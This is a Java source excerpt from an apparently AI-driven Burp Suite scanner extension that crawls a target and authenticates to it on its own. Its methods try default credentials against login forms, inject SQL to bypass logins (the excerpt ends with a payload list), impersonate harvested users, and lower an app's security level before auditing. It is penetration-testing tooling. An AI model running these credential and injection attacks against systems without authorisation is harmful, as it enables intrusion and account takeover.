        final String host = hostOf(seed);
        scope.add(host);
        restrictScopeToTarget(seed);   // Burp scans only the target host, not incidental third-party traffic
        Thread t = new Thread(() -> {
            // WAF-block accounting for the whole scan (our probes + Burp's own audit). Deregistered in finally.
            com.ioactive.aiscanner.scan.WafObserver waf = new com.ioactive.aiscanner.scan.WafObserver(api, scanLog, host);
            try {
                com.ioactive.aiscanner.engine.MontoyaLlmHttp.PARALLELISM.incrementAndGet();   // live concurrent-scan count → LLM timeouts scale by it (correct even when scans are added at will)
                scanLog.log("=== run start (build "
                        + com.ioactive.aiscanner.AiScannerExtension.BUILD + ") ===");
                com.ioactive.aiscanner.engine.LlmTiming.reset();   // per-scan LLM latency for the benchmark speed column
                com.ioactive.aiscanner.engine.LocalAiEngine.resetSeed();   // per-scan deterministic seed sequence (reproducible + cache-proof)
                // Record the exact LLM sampling config in EVERY run (GUI or headless) — temperature drives the
                // discovery variance, so it must be visible in the log/report without needing -D launch flags.
                {
                    com.ioactive.aiscanner.engine.AiEngine e0 = scanner.engine();
                    scanLog.log("engine: " + (e0 == null ? "none (no-ai / deterministic only)" : e0.paramSummary())
                            + "  |  discovery rounds=" + com.ioactive.aiscanner.scan.EndpointDiscovery.discoveryRoundsPublic());
                }
                // Burp AI is PAID — show the REAL credit balance UP FRONT (Burp caches it in WorkspaceConfig.json;
                // this is the true pre-scan number, before any prompt bills). end-of-scan logAiUsage() prints the
                // end balance + spent. Only when Burp AI is the active engine (LOCAL_LLM has no credits).
                try {
                    com.ioactive.aiscanner.engine.AiEngine eng = scanner.engine();
                    if (eng != null && eng.name() != null && eng.name().toLowerCase().contains("burp ai")) {
                        String bal = com.ioactive.aiscanner.engine.MontoyaAiEngine.noteScanStart();
                        scanLog.log("Burp AI credit balance at scan start: "
                                + (bal != null ? bal : "unknown (WorkspaceConfig.json not readable yet)"));
                    }
                } catch (Throwable ignore) { }
                // CREDIT GATE — with Burp AI, do NOT start a scan unless the balance is > 1 credit. A scan begun
                // with ≤1 credit would exhaust mid-run and yield a half-done, misleading report; better to skip it
                // outright. In a batch this deliberately trips once credits deplete, so every remaining target is
                // cleanly SKIPPED (recorded as a 0-with-reason report) rather than run to a partial result.
                String creditBlock = scanner.creditGateReason();
                if (creditBlock != null) {
                    scanLog.phase("Skipped — insufficient Burp AI credits");
                    scanLog.log("⚠ SCAN SKIPPED for " + host + " — " + creditBlock
                            + ". Refusing to start a scan that would run out of credits mid-audit.");
                    scanner.writeSkipReport(creditBlock);
                    scanner.exitIfRequested();
                    return;
                }
                boolean wasAuthed = session.authenticated();
                // Global session propagation: push any captured session (now AND on every future re-capture) into
                // Burp's cookie jar, so the NATIVE crawler + active audit run authenticated — not just our own
                // withSessionCookie() requests. Fixes auth-gated pages coming back as empty 302s to the crawl (labs
                // behind login never discovered) and POSTs 403'ing for a missing session/CSRF cookie.
                session.setOnCookieUpdate(c -> pushSessionToCookieJar(c, host));
                if (session.has()) pushSessionToCookieJar(session.cookieHeader(), host);
                excludeLogoutFromScope(seed);   // fence off *logout* BEFORE any crawl — never visited
                scanLog.phase("Crawling " + host);
                scanLog.log("crawling " + seed + " …");
                burp.api.montoya.scanner.Crawl crawl = null;
                if (scanner.communityEdition()) {
                    scanLog.log("Burp Community edition: native crawler unavailable — using the "
                            + "extension's own authenticated explorer + JS/OpenAPI discovery for the attack surface.");
                } else {
                    crawl = api.scanner().startCrawl(CrawlConfiguration.crawlConfiguration(seed));
                    waitForCrawl(crawl);
                    logCrawlInventory(host, crawl.requestCount());
                    stopTask(crawl, "crawl");   // don't let Burp keep crawling while we audit (site map is kept)
                }
                // Prime the site map with the seed page when the crawler didn't populate it — Community has no
                // native crawler, and some SPAs yield a 0-request crawl. All downstream discovery (auth mining,
                // gatherSources) reads api.siteMap(); one GET of the target gives it a page whose <script src>
                // bundles gatherSources() then fetches and mines. Generic, edition-agnostic, no-op if a same-host
                // HTML page is already present (so it never re-fetches on Pro after a real crawl).
                seedSiteMap(seed, host, false);

                // NO-EXTENSION BASELINE: with -Daiscanner.nativeOnly / AISCANNER_NATIVE_ONLY the extension acts
                // ONLY as a headless harness for Burp's own scanner — it crawls (above) then audits the crawled
                // surface with Burp's built-in checks, skipping ALL auth/discovery/probes. This yields the
                // faithful "what does plain Burp Pro find, unaided" number, counted + reported the SAME way as
                // the full runs (AiTriage → native-Burp-audit half; deterministic-oracle half is 0 by design).
                if (nativeOnly()) {
                    scanLog.log("NATIVE-ONLY baseline: no auth, no discovery, no probes — "
                            + "auditing the crawled surface with Burp's own active checks only.");
                    scanLog.phase("Native baseline audit (Burp built-in checks only)");
                    scanner.summarize(scanner.scanNativeBaseline(host), host);   // finalPhase → SCAN COMPLETE + tally + report
                    scanner.exitIfRequested();
                    return;
                }

                // Explicit user-provided session (NOT autonomous, NOT a fingerprint): a human handing
                // over their cookies via -Daiscanner.cookie/.bearer.
                if (!session.authenticated()) {
                    new AutonomousAuth(api, session, scanLog, host, seed).manualImport();
                }

                // Autonomous OAuth2 password-grant: many apps (Tiredful, OAuth labs) disclose the client_id +
                // client_secret in a page form and print demo creds in the page text — harvest both and mint a
                // bearer with no human step. Cheap & deterministic → try before the mailbox-register flow.
                if (!session.authenticated() && !session.hasBearer()) {
                    new AutonomousAuth(api, session, scanLog, host, seed).oauthPasswordGrant();
                }

                // Operator-supplied credentials (env AISCANNER_LOGIN_EMAIL/PASSWORD or -Daiscanner.loginEmail/
                // loginPassword): a direct login BEFORE autonomous sign-up — for prod/staging where disposable-
                // email registration is blocked. No-op when unset. Generic; endpoints from EndpointDiscovery.
                if (!session.authenticated() && !session.hasBearer()) {
                    // Call even with ZERO discovered login endpoints: loginWithProvidedCreds now also does a
                    // form-encoded POST to well-known login paths (Spring formLogin / SPA that renders no <form>),
                    // which needs no discovered candidate. No-op when operator creds are unset.
                    List<HttpRequest> loginEps = scanner.discoverAuthRequests(host);
                    // withEngine: enables the LLM-assisted login-from-JS fallback for JS-driven page-method logins
                    // whose custom body shape (nested/stringified credential wrappers) the generic body can't build.
                    new AutonomousAuth(api, session, scanLog, host, seed)
                            .withEngine(scanner.engine()).loginWithProvidedCreds(loginEps);
                }

                // CHEAPEST auth FIRST — a classic HTML login FORM (WordPress/DVWA/most CMSes) almost always takes
                // DEFAULT creds and is validated by a strong bad-creds-baseline oracle (loginViaForm), with NO
                // external calls and NO rate-limit-tripping brute. Trying it BEFORE the disposable-mailbox
                // registration means (a) we never mint a mailbox we don't need — the common "why are we minting
                // mailinator when admin/admin works?" waste — and (b) the strong form oracle authenticates cleanly
                // instead of the JSON register-then-login false-positiving on a guessed /login. Form logins only.
                if (!session.authenticated()) {
                    // (a) any crawled page whose response already shows a password form
                    for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                        if (rr.request() == null || !host.equalsIgnoreCase(hostOf(rr.request().url()))) continue;
                        if (responseHasPasswordForm(rr)) {
                            loginViaForm(rr.request().url(), rr.request().httpService());
                            if (session.authenticated()) break;
                        }
                    }
                    // (b) well-known login-form paths, probed DIRECTLY — the crawl is shallow/slow (WordPress under
                    // emulation) and may not have reached /wp-login.php yet. loginViaForm GETs fresh, bails if there's
                    // no password form (safe on a 404), else tries default creds with the bad-creds-baseline oracle.
                    if (!session.authenticated()) {
                        String base = seed.replaceAll("/+$", "");
                        for (String p : new String[]{ "/wp-login.php", "/login", "/user/login", "/admin/login",
                                "/administrator/index.php", "/admin", "/accounts/login/" }) {
                            try {
                                HttpService svc = HttpRequest.httpRequestFromUrl(base + p).httpService();
                                loginViaForm(base + p, svc);
                            } catch (Throwable ignore) { }
                            if (session.authenticated()) break;
                        }
                    }
                }

                // Rate-limit-safe auth: try LEGITIMATE registration (disposable mailbox → email-verify → login)
                // BEFORE any weak-cred/SQLi brute. The brute trips login rate limits (429) that then block our OWN
                // signup (self-sabotage observed on rate-limited APIs). Generic — runs only when an API auth
                // endpoint is mined AND no cheap form login above already authenticated (so no needless mailbox).
                if (!session.authenticated() && !session.hasBearer()) {
                    scanLog.phase("Automatic User Registration");
                    List<HttpRequest> loginEps = scanner.discoverAuthRequests(host);
                    // Call even with ZERO discovered login endpoints: apiRegisterThenLogin self-sources login +
                    // registration targets from OBSERVED origins (crawl/LLM discovery is run-to-run variable and
                    // may surface none, yet the API origin + a /login and a user-resource are derivable).
                    new AutonomousAuth(api, session, scanLog, host, seed)
                            .withEngine(scanner.engine())
                            .apiRegisterThenLogin(loginEps);
                }

                // Automagic: if not already authenticated, look for a login request among the
                // crawled/proxied traffic and try default creds so the audit runs authenticated.
                if (!session.authenticated()) {
                    scanLog.phase("Authenticating (trying default credentials)");
                    // The site map holds MANY copies of the same login request (crawler + probes each recorded it),
                    // so iterating it blindly re-ran the full default-creds battery per copy (2×15 combos on /login,
                    // /register twice…) — wasted requests + needless rate-limit pressure. Dedup by (method, path) so
                    // each distinct auth endpoint is attempted ONCE.
                    java.util.Set<String> triedAuth = new java.util.HashSet<>();
                    // Blast-radius cap: an app may expose the SAME login at many alias paths (each a distinct
                    // (method,path), so dedup treats them as separate endpoints and re-runs the whole default-cred +
                    // SQLi-bypass battery per alias → hundreds of login POSTs). Count only endpoints we actually
                    // batter (a login handler), and stop once we've hit the cap: if default creds fail on the first
                    // few logins, the Nth alias of the same login won't authenticate either. Generic — no per-app paths.
                    int cap = maxLoginEndpoints();
                    int loginEndpointsTried = 0;
                    boolean capLogged = false;
                    for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                        if (!host.equalsIgnoreCase(hostOf(rr.request().url()))) continue;
                        if (!triedAuth.add(rr.request().method() + " " + rr.request().url().split("\\?")[0])) continue;
                        boolean isLoginShape = hasPasswordParam(rr.request()) || isJsonLogin(rr.request())
                                || responseHasPasswordForm(rr);
                        if (isLoginShape && loginEndpointsTried >= cap) {
                            if (!capLogged) {
                                scanLog.log("default-creds: reached " + cap + " login-endpoint cap — stopping"
                                        + " (further aliases won't authenticate with default creds).");
                                capLogged = true;
                            }
                            continue;
                        }
                        if (hasPasswordParam(rr.request())) {
                            loginEndpointsTried++;
                            scanLog.log("login candidate (request): " + rr.request().url());
                            defaultCredsLogin(rr);
                            // CSRF-protected forms (e.g. DVWA's per-request user_token) reject a replayed
                            // captured body; fall back to a fresh page fetch → fresh token → submit.
                            if (!session.authenticated())
                                loginViaForm(rr.request().url(), rr.request().httpService());
                        } else if (isJsonLogin(rr.request())) {
                            loginEndpointsTried++;
                            scanLog.log("login candidate (JSON body): " + rr.request().url());
                            jsonCredsLogin(rr);
                        } else if (responseHasPasswordForm(rr)) {
                            loginEndpointsTried++;
                            loginViaForm(rr.request().url(), rr.request().httpService());
                        }
                        if (session.authenticated()) break;
                    }
                    // Fully autonomous fallback: nothing browsed → mine the client code for a login
                    // endpoint, seed it into the site map (so the auth-page audit covers it), and try
                    // to authenticate (default creds + generic SQLi auth-bypass). No manual requests.
                    if (!session.authenticated()) {
                        scanLog.log("no login in site map — mining client code for an auth endpoint…");
                        // Same blast-radius cap as the site-map loop: mined candidates can also be N aliases of one
                        // login; batter at most `cap` of them so a multi-alias login can't balloon the credential battery.
                        for (HttpRequestResponse login : probeAuthCandidates(host)) {
                            if (loginEndpointsTried >= cap) {
                                if (!capLogged) {
                                    scanLog.log("default-creds: reached " + cap + " login-endpoint cap — stopping"
                                            + " (further aliases won't authenticate with default creds).");
                                    capLogged = true;
                                }
                                break;
                            }
                            if (isJsonLogin(login.request())) { loginEndpointsTried++; jsonCredsLogin(login); }
                            else if (hasPasswordParam(login.request())) { loginEndpointsTried++; defaultCredsLogin(login); }
                            if (session.authenticated()) break;
                        }
                    }
                }

                // Still not authenticated? The app may gate everything behind a registered account
                // (no default creds). Generically sign up like a user — find a registration form by
                // shape, adapt to whatever length constraint its own validation reports — then log in.
                if (!session.authenticated()) {
                    new AutonomousAuth(api, session, scanLog, host, seed).registerThenLogin();
                }

                // API-first SPA (JSON auth, no HTML form → form register/login can't help): register + log
                // in via the JSON API and capture the JWT. This is the BUILT-IN (no browser driver) path for
                // crAPI/Juice-style apps — what makes the BApp-compliant build authenticate an SPA.
                if (!session.authenticated() && !session.hasBearer()) {
                    List<HttpRequest> loginEps = scanner.discoverAuthRequests(host);
                    // Call even with ZERO discovered login endpoints: apiRegisterThenLogin self-sources login +
                    // registration targets from OBSERVED origins (crawl/LLM discovery is run-to-run variable and
                    // may surface none, yet the API origin + a /login and a user-resource are derivable).
                    new AutonomousAuth(api, session, scanLog, host, seed)
                            .withEngine(scanner.engine())
                            .apiRegisterThenLogin(loginEps);
                }

                if (crawl != null) logCrawlInventory(host, crawl.requestCount());

                // Identity sweep: with the surface captured, harvest exposed emails and SQLi-login as
                // each specific user (generic; trips identity-gated login challenges).
                if (session.authenticated()) impersonateHarvestedIdentities(host);

                // SECOND IDENTITY B — register a SECOND distinct user into its own session and adopt it, so the
                // access-control probes (BOLA/BFLA/mass-assignment/GraphQL-authz) can run a TRUE cross-user
                // differential ("A reads/writes B's exact object") instead of a single-session distinctness+PII
                // heuristic. Best-effort: only possible where the app self-registers; no-op otherwise.
                if (session.authenticated() && !session.hasSecondIdentity()) mintSecondIdentity(host, seed);

                // If we JUST authenticated, discover the surface that only exists once logged in.
                // Order matters: (1) a general authenticated Burp pass first (carries the session
                // cookie jar) to surface the protected pages (e.g. /bank/*), THEN (2) the authenticated
                // explorer — now seeded from those freshly-discovered pages, it fetches each one and its
                // <script src> authenticated so EndpointDiscovery can mine their AJAX/data endpoints
                // (where injectable vulns like SQLi live).
                if (session.authenticated() && !wasAuthed) {
                    // Now that we're authenticated, fence login/signin out of Burp's scope too — the
                    // initial crawl already found login.html (that's how we authed), so from here on
                    // Burp's crawler/scanner must never re-hit login/signin (each hit resets the session).
                    excludeAuthPagesFromScope();

                    scanLog.phase("Re-crawling authenticated (general pass)");
                    scanLog.log("general authenticated pass over " + host + " …");
                    if (!scanner.communityEdition()) {
                        var crawl2 = api.scanner().startCrawl(CrawlConfiguration.crawlConfiguration(seed));
                        waitForCrawl(crawl2);
                        logCrawlInventory(host, crawl2.requestCount());
                        stopTask(crawl2, "authenticated crawl");
                    }
                    // ALWAYS run the session-carrying self-crawl too (BOTH editions, not just Community). Burp's
                    // native crawler does NOT read our captured session from the cookie jar at crawl start, so on Pro
                    // crawl2 re-crawls UNAUTHENTICATED — auth-gated hubs come back as empty 302s and the deep lab/vuln
                    // pages behind them (pygoat /cmd → /cmd_lab, etc.) are never discovered. seedSiteMap attaches the
                    // Cookie header to EVERY fetch (seedFetch) + seeds from root, so it reliably reaches the
                    // authenticated surface the native crawler misses. Dedup keeps it from re-doing crawl2's work.
                    seedSiteMap(seed, host, true);

                    // Belt-and-suspenders: if a non-standard logout slipped through and killed the
                    // session, re-authenticate so the explorer fetches protected pages (/bank/*) as 200.
                    scanLog.phase("Re-authenticating (in case the session was invalidated)");
                    reauthenticate();

                    scanLog.phase("Exploring authenticated surface");
                    new AuthenticatedExplorer(api, session, scanLog).explore(host, session.landingUrl());

                    // If the protected API is signature-gated (a valid bearer still gets "Missing request
                    // signature"), a JWT alone can't reach the deep surface. Have the LLM read the JS bundles
                    // now in the site map and locate the client-side signing function so we can reproduce it.
                    detectRequestSigning(host);
                }

                // Post-auth generic setup: prime the data store (submit any create/reset form once),
                // then treat a "security/difficulty" selector as a FUZZABLE GLOBAL MODE — enumerate ALL
                // its options and run a full audit under each, unioning findings. The oracle (not a
                // hardcoded "low" word-list) decides which level is exploitable. No app identification.
                AutonomousAuth aa = new AutonomousAuth(api, session, scanLog, host, seed);
                String[] secSel = null;
                java.util.List<String> levels = java.util.Collections.emptyList();
                if (session.authenticated()) {
                    aa.initDataStores();
                    secSel = aa.securitySelector();
                    if (secSel != null) levels = aa.optionValues(secSel[0], secSel[1]);
                }

                scanLog.log("crawl done; AI-scanning " + host + " …");
                // Let the probe battery refresh a stale session mid-run: the captured session can expire over the
                // ~10+ min of probing, so authenticated-only endpoints later bounce to login and late probes miss
                // them. AiScanner calls this back just before its authenticated reflected-XSS phase. No-op unless
                // a re-authable session was captured (canReauth()).
                scanner.setReauth(this::reauthenticate);
                // Register B-minting at the battery start (auth is settled there), the reliable point vs the earlier
                // best-effort attempt above which can race the async login.
                scanner.setSecondIdentityMinter(() -> mintSecondIdentity(host, seed));
                if (levels.isEmpty()) {
                    scanLog.phase("Submitting discovered requests to Burp active audit");
                    scanner.summarize(scanner.scanDiscovered(host), host, false);   // main audit — concise line; banner prints once at the end
                } else {
                    // A "security/difficulty" selector: set the app to its WEAKEST posture (max vuln
                    // exposure, the way a pentester lowers difficulty) and audit ONCE. Auditing every
                    // option was N× the cost for no extra vuln-CLASS coverage — the weakest level exposes
                    // them all. Generic: pick the option matching a "least-secure" word, else the first.
                    String weakest = levels.stream()
                            .filter(v -> v.matches("(?i)(low|easy|insecure|none|off|no|disabled?)"))
                            .findFirst().orElse(levels.get(0));
                    aa.applySecurity(secSel[0], secSel[1], weakest);
                    scanLog.log("'" + secSel[1] + "' selector " + levels
                            + " → auditing at weakest=" + weakest
                            + " (session.cookie=[" + session.cookieHeader() + "])");
                    scanLog.phase("Auditing at " + secSel[1] + "=" + weakest);
                    scanner.summarize(scanner.scanDiscovered(host), host, false);   // main audit — concise line; banner prints once at the end
                }

                // Now that the authenticated audit is done, audit login/signin separately for
                // login-injection coverage — its self-logout no longer costs us anything.
                scanLog.phase("Auditing login/signin (separate, session no longer needed)");
                scanner.summarize(scanner.auditAuthPages(host), host);
                // ALL audits finished → NOW honor -Daiscanner.exitOnComplete (headless/Docker run). Exiting
                // after an earlier summarize() would kill Burp while the login audit was still sending.
                scanner.exitIfRequested();
            } catch (com.ioactive.aiscanner.ui.ScanLog.ScanStopped stopped) {
                scanLog.log("scan stopped by user — halted at phase \"" + scanLog.currentPhase() + "\".");
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                scanLog.log("scan interrupted — stopping.");
            } catch (Exception ex) {
                scanLog.log("crawl+scan failed: " + ex.getMessage());
            } finally {
                com.ioactive.aiscanner.engine.MontoyaLlmHttp.PARALLELISM.decrementAndGet();   // this scan ended → drop the live concurrent count
                try { waf.summary(); } catch (Throwable ignore) { }
                waf.close();
                scanLog.setScanActive(false);   // scan finished/stopped → the Stop button goes inactive
            }
        }, "ais-crawl-scan");
        t.setDaemon(true);
        // A fresh scan clears any prior Stop and re-arms the Stop button.
        scanner.resetStop();
        scanLog.setScanActive(true);
        t.start();
        return t;
    }

    /** No-extension baseline switch: audit only Burp's own crawl with Burp's own checks (no auth/discovery/probes). */
    private static boolean nativeOnly() {
        String v = System.getProperty("aiscanner.nativeOnly");
        if (v == null || v.isBlank()) v = System.getenv("AISCANNER_NATIVE_ONLY");
        return v != null && (v.equalsIgnoreCase("true") || v.equals("1") || v.equalsIgnoreCase("yes"));
    }

    /** Max number of DISTINCT login endpoints subjected to the full default-cred + SQLi-bypass battery in the auth
     *  phase. Blast-radius cap: some apps expose the SAME login handler at many alias paths (observed: one ASP.NET
     *  login reachable at ~38 URLs). Dedup is by (method,path), so each alias looks distinct and the whole credential
     *  battery re-runs per alias → hundreds of login POSTs (rate-limit/lockout/WAF risk, wasted budget). If the same
     *  default creds fail on the first few login endpoints, an Nth alias of the same login won't succeed either, so we
     *  stop after this many. Generic — no per-app paths. Override with -Daiscanner.maxLoginEndpoints / AISCANNER_MAX_LOGIN_ENDPOINTS. */
    private static int maxLoginEndpoints() {
        String v = System.getProperty("aiscanner.maxLoginEndpoints");
        if (v == null || v.isBlank()) v = System.getenv("AISCANNER_MAX_LOGIN_ENDPOINTS");
        if (v != null && !v.isBlank()) {
            try { return Math.max(1, Integer.parseInt(v.trim())); } catch (NumberFormatException ignore) { }
        }
        return 4;   // small default: enough to cover genuinely-distinct logins, tight enough to kill alias multiplication
    }

    /** Cancel a scan task so it stops running in the background (its site-map entries are kept). */
    private void stopTask(burp.api.montoya.scanner.Crawl task, String label) {
        try {
            task.delete();
            scanLog.debug("stopped " + label + " task (audit runs alone).");
        } catch (Throwable t) {
            scanLog.debug("could not stop " + label + " task: " + t);
        }
    }

    /** Block until the crawl's request count stabilises (heuristic completion), capped so we never hang. We do NOT
     *  call {@code crawl.statusMessage()}: it is UnsupportedOperationException on current Burp builds and — even
     *  when caught — makes Burp print a proxy stack trace on the first call. */
    private void waitForCrawl(burp.api.montoya.scanner.Crawl crawl) throws InterruptedException {
        int last = -1, stable = 0, ticks = 0;
        long begin = System.currentTimeMillis();
        long deadline = begin + com.ioactive.aiscanner.scan.Tuning.crawlWaitSec() * 1000L;   // configurable (Timeouts)
        while (System.currentTimeMillis() < deadline) {
            Thread.sleep(3000);
            int c = pollCrawlCount(crawl, last);   // BOUNDED poll: a hung requestCount() must not defeat the deadline
            long elapsed = System.currentTimeMillis() - begin;
            // requestCount stability = done, but only after a 45s floor so a JS-heavy / low-request crawl isn't
            // declared finished instantly (statusMessage — the accurate signal — is unavailable on this build).
            if (c == last) { if (++stable >= 6 && elapsed > 45000) break; } else { stable = 0; last = c; }
            if (++ticks % 5 == 0) scanLog.debug("crawl… requests: " + c);
        }
        scanLog.log("crawl wait ended (requests stable / timeout).");
    }

    // Bounded poll of Burp's Crawl.requestCount(). Observed a single requestCount() call BLOCK ~16 min on a
    // 0-request crawl, freezing waitForCrawl far past its 4-min deadline — the deadline is only checked BETWEEN
    // iterations, so a Montoya call that blocks inside the loop defeats it entirely (same root cause as the LLM
    // transport stall: a Montoya call with no client-side timeout we can enforce). Run each poll on a daemon thread
    // and abandon it after a few seconds, returning the last known count so the stable/deadline logic keeps advancing.
    private static final java.util.concurrent.ExecutorService CRAWL_POLL_POOL =
            java.util.concurrent.Executors.newCachedThreadPool(r -> {
                Thread t = new Thread(r, "aiscanner-crawl-poll"); t.setDaemon(true); return t;
            });
    private int pollCrawlCount(burp.api.montoya.scanner.Crawl crawl, int fallback) {
        try {
            return CRAWL_POLL_POOL.submit((java.util.concurrent.Callable<Integer>) crawl::requestCount)
                    .get(5, java.util.concurrent.TimeUnit.SECONDS);
        } catch (Throwable t) {
            return fallback < 0 ? 0 : fallback;   // hung/failed poll → treat as "no change" so the wait settles / deadlines out
        }
    }

    /** After the crawl stabilises, list the host's discovered URIs + params (skipping static assets). */
    private void logCrawlInventory(String host, int requestCount) {
        scanLog.log("crawl found " + requestCount + " request(s); inventory for " + host + ":");
        Set<String> shown = new HashSet<>();
        int urls = 0, withParams = 0;
        for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
            HttpRequest q = rr.request();
            if (!host.equalsIgnoreCase(hostOf(q.url()))) continue;
            String path = q.url();
            int qm = path.indexOf('?');
            if (qm >= 0) path = path.substring(0, qm);
            if (isStaticAsset(path)) continue;
            if (!shown.add(q.method() + " " + path)) continue;
            String ps = paramNames(q);
            urls++;
            if (!ps.isEmpty()) withParams++;
            scanLog.log("  • " + q.method() + " " + path
                    + (ps.isEmpty() ? "" : "  [" + ps + "]"));
        }
        scanLog.log("inventory: " + urls + " URI(s), " + withParams + " with parameters.");
    }

    private static String paramNames(HttpRequest req) {
        if (!req.hasParameters()) return "";
        StringBuilder sb = new StringBuilder();
        for (ParsedHttpParameter p : req.parameters()) {
            if (p.type() != burp.api.montoya.http.message.params.HttpParameterType.URL
                    && p.type() != burp.api.montoya.http.message.params.HttpParameterType.BODY) continue;
            if (sb.length() > 0) sb.append(", ");
            sb.append(p.name());
        }
        return sb.toString();
    }

    private void defaultCredsLogin(HttpRequestResponse loginRr) {
        try {
            HttpRequest base = loginRr.request();
            if (isRegistrationRequest(base)) {
                scanLog.debug("default-creds: skipping " + base.url()
                        + " — registration/change-password form, not a login (routed to register-then-login).");
                return;
            }
            String userParam = null, passParam = null;
            for (ParsedHttpParameter p : base.parameters()) {
                if (passParam == null && PASS_PARAM.matcher(p.name()).matches()) passParam = p.name();
                else if (userParam == null && USER_PARAM.matcher(p.name()).matches()) userParam = p.name();
            }
            if (passParam == null) {
                scanLog.log("default-creds: no password-like parameter in the selected request.");
                return;
            }
            // Scan-scoped guard: the SAME /login is fed to this battery by several auth strategies (site-map loop,
            // mined-candidate loop, …) and the orchestrator re-enters them, so without this the identical 15-combo
            // form battery re-brute-forces one endpoint 2-3× (observed on DVNA). Run it ONCE per endpoint. The
            // "dc " prefix keeps a namespace distinct from loginViaForm (plain url) and jsonCredsLogin ("json ")
            // so each of the 3 request-shapes still gets its single attempt — we kill repeats, not coverage.
            if (!bruteforcedLogins.add("dc " + base.url().split("\\?")[0])) {
                scanLog.log("default-creds: skip " + base.url().split("\\?")[0]
                        + " — default-cred battery already run this scan.");
                return;
            }
            scanLog.log("default-creds: user='" + userParam + "' pass='" + passParam
                    + "' on " + base.url());

            HttpRequestResponse bad = tryLogin(base, userParam, "zzinvalid_ai_x", passParam, "zzinvalid_ai_x");
            int badStatus = status(bad);
            int badLen = bodyLen(bad);
            Set<String> badCookies = cookieNames(bad);

            // GATE: only brute an endpoint that actually BEHAVES like a login. A real login rejects invalid creds
            // with a credential error (400/401/403/200/302); a 404/405/415/501 (e.g. nginx "Method Not Allowed")
            // means this isn't a login handler — running the whole credential wordlist against it only storms 405s
            // and trips rate limits (observed on the admin scan: ~25 bogus candidates × the wordlist = 82% dup log).
            if (badStatus == 404 || badStatus == 405 || badStatus == 415 || badStatus == 501 || badStatus <= 0) {
                scanLog.log("default-creds: skip " + base.url() + " — not a login handler (HTTP " + badStatus + ").");
                return;
            }
            if (badStatus == 429) {
                scanLog.log("default-creds: " + base.url() + " already rate-limited (429) — skip.");
                return;
            }

            for (String[] cred : DEFAULT_CREDS) {
                HttpRequestResponse resp = tryLogin(base, userParam, cred[0], passParam, cred[1]);
                int sc = status(resp);
                scanLog.log("    try " + cred[0] + "/" + cred[1] + " → HTTP "
                        + sc + ", " + bodyLen(resp) + "b" + locSuffix(resp));
                if (looksLikeSuccess(resp, bad, cred[0], cred[1])) {
                    // Evidence = the successful login POST (carries the working credentials payload).
                    captureSession(resp, resp, hostOf(base.url()), cred[0], cred[1]);
                    return;
                }
                // Rate-limited: STOP. Continuing just storms 429s and poisons the legit register/login flow.
                if (sc == 429) { scanLog.log("default-creds: endpoint rate-limited (429) — stopping brute."); return; }
            }
            scanLog.log("default-creds: none of " + DEFAULT_CREDS.length + " combos worked.");
        } catch (Exception ex) {
            scanLog.log("default-creds failed: " + ex.getMessage());
        }
    }

    private static final java.util.regex.Pattern TOKEN_PARAM =
            java.util.regex.Pattern.compile("(?i)(token|csrf|nonce|authenticity|xsrf|_token)");

    private HttpRequestResponse tryLogin(HttpRequest base, String userP, String user, String passP, String pass) {
        // Fetch the login form FRESH first: obtain a session cookie + a fresh anti-CSRF token that MATCH each other.
        // Replaying the captured request's stale cookie/token half-authenticates on apps that rotate the token per
        // request or regenerate the session id on login (DVWA, PHP session_regenerate_id, Django, Rails) — the
        // login 302s to the landing yet the cookie stays unauthenticated, so every protected page bounces to login.
        // Generic for any token-bearing form.
        HttpRequestResponse gr = api.http().sendRequest(
                HttpRequest.httpRequestFromUrl(base.url()).withMethod("GET"), RequestOptions.requestOptions().withResponseTimeout(12000L));
        String freshCookie = buildCookieHeader(gr);
        String body = base.bodyToString();
        if (userP != null) body = replaceParam(body, userP, user);
        body = replaceParam(body, passP, pass);
        if (gr != null && gr.response() != null) {
            String html = gr.response().bodyToString();
            for (ParsedHttpParameter p : base.parameters()) {
                String n = p.name();
                if (n.equals(userP) || n.equals(passP) || !TOKEN_PARAM.matcher(n).find()) continue;
                String v = freshTokenValue(html, n);
                if (v != null) body = replaceParam(body, n, v);
            }
        }
        HttpRequest req = base.withBody(body);
        if (!freshCookie.isBlank()) req = req.withHeader("Cookie", freshCookie);
        return api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L));
    }

    /** Fresh value of a hidden anti-CSRF field from a just-fetched form (handles name-before-value and value-before-name). */
    private static String freshTokenValue(String html, String name) {
        if (html == null) return null;
        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                "(?is)name=['\"]?" + java.util.regex.Pattern.quote(name) + "['\"]?[^>]*?value=['\"]([^'\"]+)"
                + "|value=['\"]([^'\"]+)['\"][^>]*?name=['\"]?" + java.util.regex.Pattern.quote(name)).matcher(html);
        if (m.find()) return m.group(1) != null ? m.group(1) : m.group(2);
        return null;
    }

    private static String replaceParam(String body, String name, String value) {
        String repl = URLEncoder.encode(value, StandardCharsets.UTF_8);
        return body.replaceAll("(?i)(^|&)(" + Pattern.quote(name) + "=)[^&]*",
                "$1$2" + Matcher.quoteReplacement(repl));
    }

    // ---- JSON / token (JWT) login (SPA & API style) — abstract: driven by Content-Type + key names ----

    private static final Pattern JSON_KEY = Pattern.compile("\"([^\"]+)\"\\s*:");
    private static final Pattern JSON_TOKEN = Pattern.compile(
            "\"(?:access_token|id_token|authtoken|token|jwt|bearer)\"\\s*:\\s*\"([^\"]{8,})\"",
            Pattern.CASE_INSENSITIVE);

    /** A request carrying a JSON body that contains a password-like key → a token/API login. */
    private static boolean isJsonLogin(HttpRequest req) {
        String ct = req.hasHeader("Content-Type") ? req.headerValue("Content-Type") : "";
        if (ct == null || !ct.toLowerCase().contains("json")) return false;
        String body = req.bodyToString();
        return body != null && findJsonKey(body, PASS_PARAM) != null;
    }

    private static String findJsonKey(String body, Pattern namePat) {
        Matcher m = JSON_KEY.matcher(body);
        while (m.find()) if (namePat.matcher(m.group(1)).matches()) return m.group(1);
        return null;
    }

    // Generic SQL-injection authentication-bypass payloads (not app-specific) — a legit autonomous
    // attack that both authenticates AND evidences a login-SQLi when the login form is injectable.
    private static final String[] AUTH_BYPASS = {
            "' OR 1=1--", "' OR '1'='1", "') OR ('1'='1'--", "\" OR 1=1--", "' OR 1=1#", "admin'--"
    };
